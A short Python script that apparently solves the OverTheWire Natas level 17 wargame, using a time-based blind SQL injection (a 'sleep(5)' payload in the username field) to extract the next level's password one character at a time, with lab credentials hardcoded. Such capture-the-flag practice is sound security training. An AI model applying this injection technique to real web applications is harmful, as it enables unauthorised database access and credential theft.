import requests

chars='0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
password='8NEDUUx'
url='http://natas17.natas.labs.overthewire.org/index.php?'

for n in range(len(password), 33):
  for char in chars:
    params = {
      "debug": "1",
      "username": 'natas18" and binary password like "' + password + char + '%" and sleep(5)#'
    }
    response = requests.get(url, params = params, auth = ("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"))
    #print(response.content.decode('utf-8'))
    #print(char + " " + str(response.elapsed.total_seconds()))
    if response.elapsed.total_seconds() > 5:
      password += char
      print(password)
      break